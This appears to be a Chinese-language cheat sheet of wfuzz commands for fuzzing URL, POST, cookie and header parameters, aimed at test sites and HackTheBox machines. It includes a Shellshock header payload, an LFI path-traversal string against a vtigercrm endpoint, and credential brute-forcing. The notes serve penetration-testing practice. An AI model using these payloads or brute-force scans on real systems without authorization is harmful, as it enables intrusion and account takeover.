## 常用指令

```bash
wfuzz -e encoders // 查看支持的编码, 如 url_hex
wfuzz -u http://localhost.com/?_d=xxxFUZZ -w ./SecLists/Fuzzing/alphanum-case-extra.txt,url_hex
```



```bash
--hc: 不输出状态码等于你设置的状态码的响应包(比如设置为200,那就不会输出状态码等于200的包)
--hl: 不输出行数等于你设置的行数的响应包
--hw: 不输出字数等于你设置的字数的响应包
--hh: 不输出字符数等于你设置的字符数的响应包
--hs: 不输出响应包中包含你输入的字符串的响应包
--sc: 输出状态码等于你设置的状态码的响应包
--sl: 输出行数等于你设置的行数的响应包
--sw: 输出字数等于你设置的字数的响应包
--sh: 输出字符数等于你设置的字符数的响应包
--ss: 输出响应包中包含你输入的字符串的响应包
```



## 测试url参数

```bash
wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ
```



## 测试POST参数

```bash
wfuzz -z file,wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZZ" --hc 302 http://testphp.vulnweb.com/userinfo.php
```



## 测试cookie参数

```bash
wfuzz -z file,wordlist/general/common.txt -b cookie=FUZZ http://testphp.vulnweb.com/
```



## 特殊符号的Fuzzing

```bash
wfuzz -u http://localhost.com/?_d=xxxFUZZ -w ./SecLists/Fuzzing/alphanum-case-extra.txt
```



## 测试headers

```bash
wfuzz -z file,wordlist/general/common.txt -H "User-Agent: FUZZ" http://testphp.vulnweb.com/
```



## 正则过滤

```bash
wfuzz -H "User-Agent: () { :;}; echo; echo vulnerable" --ss vulnerable -w cgis.txt http://localhost:8000/FUZZ
```



## 使用代理

```bash
wfuzz -z file,wordlist/general/common.txt -p localhost:8080 http://testphp.vulnweb.com/FUZZ
wfuzz -z file,wordlist/general/common.txt -p localhost:2222:SOCKS5 http://testphp.vulnweb.com/FUZZ # Proxies using SOCKS4 and 5
wfuzz -z file,wordlist/general/common.txt -p localhost:8080 -p localhost:9090 http://testphp.vulnweb.com/FUZZ # Multiple Proxies
```



## Authentication

```bash
wfuzz -z list,nonvalid-httpwatch --basic FUZZ:FUZZ https://www.httpwatch.com/httpgallery/authentication/authenticatedimage/default.aspx #basic/ntlm/digest
```



## filter

```bash
wfuzz --filter "l>0" -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt "https://<IP>/vtigercrm/graph.php?current_language=../../../../../../../../FUZZ%00&module=Accounts&action"
```



## 实例

```bash
wfuzz -Z -c -t 10 -H "Content-Type: application/json" -H "Cookie: _csrf=ALceg5YLCC3wT3Hfk4QIFae-" -w cewl-forum.txt -d '{"email":"FUZZ@nunchucks.htb","password":"123456"}' -X POST -u "https://nunchucks.htb:443/api/login"

wfuzz -c -w /home/kali/tools/DictionaryTools/IntruderPayloads/Repositories/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --hh 19 http://fluxcapacitor.htb/sync?FUZZ=test

wfuzz -c -u http://<IP>/ -H "Host: FUZZ.nineveh.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 178
```

